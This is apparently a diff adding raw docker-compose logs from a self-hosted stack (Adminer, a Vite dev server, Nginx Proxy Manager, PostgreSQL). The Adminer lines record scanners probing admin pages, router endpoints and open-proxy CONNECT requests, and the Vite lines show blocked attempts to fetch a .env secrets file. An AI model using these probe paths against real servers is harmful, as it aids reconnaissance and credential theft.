+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46884 [200]: GET /pools/default/buckets
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46884 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46898 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46894 [404]: GET /home.jhtml - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46898 [200]: GET /HNAP1
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46898 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46894 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46912 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46912 [200]: HEAD http://www.wikipedia.org
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46912 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46928 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46922 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46928 [200]: GET /pools
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46928 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46922 [404]: GET /index.aspx - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46922 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46938 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46938 [200]: CONNECT www.wikipedia.org:80
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46938 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46950 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46950 [404]: CONNECT /start.jsp - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46950 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46954 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46954 [200]: GET http://www.computerhistory.org
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46954 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46962 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46962 [404]: GET /admin.jhtml - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46962 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46974 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46974 [200]: CONNECT www.computerhistory.org:80
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46974 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46982 Accepted
+[34mnodejs_app   |[0m 
+[34mnodejs_app   |[0m > frontend@0.0.0 dev
+[34mnodejs_app   |[0m > vite --host
+[34mnodejs_app   |[0m 
+[34mnodejs_app   |[0m 
+[34mnodejs_app   |[0m ♻️  Generating routes...
+[34mnodejs_app   |[0m ✅ Processed routes in 1686ms
+[34mnodejs_app   |[0m 
+[34mnodejs_app   |[0m   VITE v5.3.3  ready in 3425 ms
+[34mnodejs_app   |[0m 
+[34mnodejs_app   |[0m   ➜  Local:   http://localhost:5173/
+[34mnodejs_app   |[0m   ➜  Network: http://172.18.0.2:5173/
+[34mnodejs_app   |[0m The request url "/app/.env" is outside of Vite serving allow list.
+[34mnodejs_app   |[0m 
+[34mnodejs_app   |[0m - /app
+[34mnodejs_app   |[0m 
+[34mnodejs_app   |[0m Refer to docs https://vitejs.dev/config/server-options.html#server-fs-allow for configurations and more details.
+[34mnodejs_app   |[0m 
+[34mnodejs_app   |[0m The request url "/app/.env" is outside of Vite serving allow list.
+[34mnodejs_app   |[0m The request url "/app/.env" is outside of Vite serving allow list.
+[34mnodejs_app   |[0m Files in the public directory are served at the root path.
+[34mnodejs_app   |[0m Instead of /public/.env, use /.env.
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:13 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:14 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:14 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:14 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:14 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:14 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:14 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:05:14 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:09:00 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:10:57 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:16:14 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:16:14 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:16:14 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:16:14 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:16:14 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:16:14 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:16:14 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:03 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:03 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:03 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:03 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:03 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:03 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:10 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:10 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/3.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:10 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:10 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:10 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:10 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf.err
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf.err"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[36;1mpostgres_db  |[0m 
+[36;1mpostgres_db  |[0m PostgreSQL Database directory appears to contain a database; Skipping initialization
+[36;1mpostgres_db  |[0m 
+[36;1mpostgres_db  |[0m 2024-07-09 17:03:42.643 UTC [1] LOG:  starting PostgreSQL 16.3 (Debian 16.3-1.pgdg120+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 12.2.0-14) 12.2.0, 64-bit
+[36;1mpostgres_db  |[0m 2024-07-09 17:03:42.645 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+[36;1mpostgres_db  |[0m 2024-07-09 17:03:42.645 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+[36;1mpostgres_db  |[0m 2024-07-09 17:03:42.651 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+[36;1mpostgres_db  |[0m 2024-07-09 17:03:42.676 UTC [27] LOG:  database system was shut down at 2024-07-09 17:03:30 UTC
+[36;1mpostgres_db  |[0m 2024-07-09 17:03:42.715 UTC [1] LOG:  database system is ready to accept connections
+[36;1mpostgres_db  |[0m 2024-07-09 17:08:42.761 UTC [25] LOG:  checkpoint starting: time
+[36;1mpostgres_db  |[0m 2024-07-09 17:08:42.785 UTC [25] LOG:  checkpoint complete: wrote 3 buffers (0.0%); 0 WAL file(s) added, 0 removed, 0 recycled; write=0.008 s, sync=0.003 s, total=0.023 s; sync files=2, longest=0.002 s, average=0.001 s; distance=0 kB, estimate=0 kB; lsn=0/1994168, redo lsn=0/1994130
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46982 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46982 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46990 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46990 [404]: CONNECT /home.aspx - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:30 2024] [::ffff:178.79.139.171]:46990 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47000 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47000 [404]: CONNECT /home.jsa - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47000 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47010 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47010 [404]: CONNECT /indice.php - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47010 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47016 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47016 [404]: CONNECT /main.asp - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47016 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47018 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47018 [404]: CONNECT /index.html - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47018 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47022 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47022 [404]: CONNECT /menu.shtml - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47022 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47024 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47024 [404]: CONNECT /default.jsa - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47024 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47034 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47034 [404]: CONNECT /admin.html - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:31 2024] [::ffff:178.79.139.171]:47034 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47040 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47040 [404]: CONNECT /indice.aspx - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47040 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47050 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47050 [404]: CONNECT /admin.cfm - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47050 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47056 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47056 [404]: CONNECT /base.inc - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47056 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47068 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47068 [404]: CONNECT /admin.aspx - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47068 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47084 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47084 [404]: CONNECT /index.cgi - No such file or directory
+[36madminer      |[0m [Wed Jul 10 02:45:32 2024] [::ffff:178.79.139.171]:47084 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:33 2024] [::ffff:178.79.139.171]:47100 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:33 2024] [::ffff:178.79.139.171]:47100 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 02:45:33 2024] [::ffff:178.79.139.171]:47100 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:39 2024] [::ffff:178.79.139.171]:46612 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 02:45:39 2024] [::ffff:178.79.139.171]:46612 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:39 2024] [::ffff:178.79.139.171]:52718 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:39 2024] [::ffff:178.79.139.171]:52718 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 02:45:39 2024] [::ffff:178.79.139.171]:52718 Closing
+[36madminer      |[0m [Wed Jul 10 02:45:40 2024] [::ffff:178.79.139.171]:52730 Accepted
+[36madminer      |[0m [Wed Jul 10 02:45:40 2024] [::ffff:178.79.139.171]:52730 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 02:45:40 2024] [::ffff:178.79.139.171]:52730 Closing
+[36madminer      |[0m [Wed Jul 10 03:06:46 2024] [::ffff:189.157.223.99]:45521 Accepted
+[36madminer      |[0m [Wed Jul 10 03:06:46 2024] [::ffff:189.157.223.99]:45521 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 03:06:46 2024] [::ffff:189.157.223.99]:45521 Closing
+[36madminer      |[0m [Wed Jul 10 03:13:41 2024] [::ffff:87.121.69.27]:57596 Accepted
+[36madminer      |[0m [Wed Jul 10 03:13:41 2024] [::ffff:87.121.69.27]:57596 [200]: CONNECT google.com:443
+[36madminer      |[0m [Wed Jul 10 03:13:41 2024] [::ffff:87.121.69.27]:57596 Closing
+[36madminer      |[0m [Wed Jul 10 03:20:29 2024] [::ffff:147.91.249.85]:43492 Accepted
+[36madminer      |[0m [Wed Jul 10 03:20:29 2024] [::ffff:147.91.249.85]:43492 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 03:20:29 2024] [::ffff:147.91.249.85]:43492 Closing
+[36madminer      |[0m [Wed Jul 10 03:28:57 2024] [::ffff:172.212.59.78]:43098 Accepted
+[36madminer      |[0m [Wed Jul 10 03:29:07 2024] [::ffff:172.212.59.78]:43098 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 03:29:07 2024] [::ffff:172.212.59.78]:43098 Closing
+[36madminer      |[0m [Wed Jul 10 03:43:25 2024] [::ffff:216.218.206.71]:3641 Accepted
+[36madminer      |[0m [Wed Jul 10 03:43:25 2024] [::ffff:216.218.206.71]:3641 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 03:43:25 2024] [::ffff:216.218.206.71]:3641 Closing
+[36madminer      |[0m [Wed Jul 10 03:43:49 2024] [::ffff:216.218.206.79]:38031 Accepted
+[36madminer      |[0m [Wed Jul 10 03:43:49 2024] [::ffff:216.218.206.79]:38031 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 03:43:49 2024] [::ffff:216.218.206.79]:38031 Closing
+[36madminer      |[0m [Wed Jul 10 03:55:37 2024] [::ffff:68.69.186.202]:33688 Accepted
+[36madminer      |[0m [Wed Jul 10 03:55:37 2024] [::ffff:68.69.186.202]:33688 [200]: CONNECT www.google.com:443
+[36madminer      |[0m [Wed Jul 10 03:55:37 2024] [::ffff:68.69.186.202]:33688 Closing
+[36madminer      |[0m [Wed Jul 10 04:08:23 2024] [::ffff:147.185.132.78]:57244 Accepted
+[36madminer      |[0m [Wed Jul 10 04:08:24 2024] [::ffff:147.185.132.78]:57244 [200]: GET /
+[36madminer      |[0m [Wed Jul 10 04:08:24 2024] [::ffff:147.185.132.78]:57244 Closing
+[36madminer      |[0m [Wed Jul 10 04:39:54 2024] [::ffff:94.156.10.164]:45344 Accepted
+[36madminer      |[0m [Wed Jul 10 04:39:54 2024] [::ffff:94.156.10.164]:45344 [200]: POST /goform/set_LimitClient_cfg
+[36madminer      |[0m [Wed Jul 10 04:39:54 2024] [::ffff:94.156.10.164]:45344 Closing
+[36madminer      |[0m [Wed Jul 10 04:44:42 2024] [::ffff:4.151.37.147]:39906 Accepted
+[36madminer      |[0m [Wed Jul 10 04:44:42 2024] [::ffff:4.151.37.147]:39906 Invalid request (Unsupported SSL request)
+[36madminer      |[0m [Wed Jul 10 04:44:42 2024] [::ffff:4.151.37.147]:39906 Closing
+[36madminer      |[0m [Wed Jul 10 05:04:51 2024] [::ffff:38.222.90.32]:41877 Accepted
+[36madminer      |[0m [Wed Jul 10 05:04:51 2024] [::ffff:38.222.90.32]:41877 Invalid request (Malformed HTTP request)
+[36madminer      |[0m [Wed Jul 10 05:04:51 2024] [::ffff:38.222.90.32]:41877 Closing
+[36madminer      |[0m [Wed Jul 10 05:04:52 2024] [::ffff:38.222.90.32]:41879 Accepted
+[36madminer      |[0m [Wed Jul 10 05:04:52 2024] [::ffff:38.222.90.32]:41879 Closed without sending a request; it was probably just an unused speculative preconnection
+[36madminer      |[0m [Wed Jul 10 05:04:52 2024] [::ffff:38.222.90.32]:41879 Closing
+[36madminer      |[0m [Wed Jul 10 05:36:22 2024] [::ffff:87.121.69.27]:39540 Accepted
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Nginx    ] › ℹ  info      Reloading Nginx
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:18:37 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -s reload
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
+[32mnginx_proxy_manager |[0m   "code": "ENOENT",
+[32mnginx_proxy_manager |[0m   "syscall": "unlink",
+[32mnginx_proxy_manager |[0m   "path": "/data/nginx/proxy_host/1.conf"
+[32mnginx_proxy_manager |[0m }
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Global   ] › ⬤  debug     CMD: /usr/sbin/nginx -t -g "error_log off;"
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Nginx    ] › ⬤  debug     Deleting file: /data/nginx/proxy_host/1.conf
+[32mnginx_proxy_manager |[0m [7/9/2024] [10:19:09 PM] [Nginx    ] › ⬤  debug     Could not delete file: {
+[32mnginx_proxy_manager |[0m   "errno": -2,
